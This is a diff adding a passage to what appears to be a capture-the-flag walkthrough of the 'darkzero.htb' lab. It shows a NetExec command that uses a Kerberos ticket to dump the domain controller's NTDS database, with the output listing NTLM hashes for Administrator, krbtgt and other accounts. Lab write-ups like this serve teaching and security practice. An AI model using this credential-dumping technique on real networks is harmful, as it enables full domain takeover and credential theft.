@@ -964,5 +964,27 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 Ill save it to a file then convert it to a ccache file
 
 ```python
-export KRB5CCNAME=
+export KRB5CCNAME=dc01.ccache
 ```
+
+Ill then export it
+
+```python
+nxc smb dc01.darkzero.htb --use-kcache --ntds                                                     
+SMB         dc01.darkzero.htb 445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         dc01.darkzero.htb 445    DC01             [+] DARKZERO.HTB\DC01$ from ccache 
+SMB         dc01.darkzero.htb 445    DC01             [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+SMB         dc01.darkzero.htb 445    DC01             [+] Dumping the NTDS, this could take a while so go grab a redbull...
+SMB         dc01.darkzero.htb 445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:5917507bdf2ef2c2b0a869a1cba40726:::
+SMB         dc01.darkzero.htb 445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         dc01.darkzero.htb 445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:64f4771e4c60b8b176c3769300f6f3f7:::
+SMB         dc01.darkzero.htb 445    DC01             john.w:2603:aad3b435b51404eeaad3b435b51404ee:44b1b5623a1446b5831a7b3a4be3977b:::
+SMB         dc01.darkzero.htb 445    DC01             DC01$:1000:aad3b435b51404eeaad3b435b51404ee:d02e3fe0986e9b5f013dad12b2350b3a:::
+SMB         dc01.darkzero.htb 445    DC01             darkzero-ext$:2602:aad3b435b51404eeaad3b435b51404ee:ab86825c846fe43b222c88da4d39bf9e:::
+SMB         dc01.darkzero.htb 445    DC01             [+] Dumped 6 NTDS hashes to /home/kali/.nxc/logs/ntds/DC01_dc01.darkzero.htb_2026-08-20_221613.ntds of which 4 were added to the database
+SMB         dc01.darkzero.htb 445    DC01             [*] To extract only enabled accounts from the output file, run the following command: 
+SMB         dc01.darkzero.htb 445    DC01             [*] grep -iv disabled /home/kali/.nxc/logs/ntds/DC01_dc01.darkzero.htb_2026-08-20_221613.ntds | cut -d ':' -f1
+```
+
+Then i can dump the secrets!
+
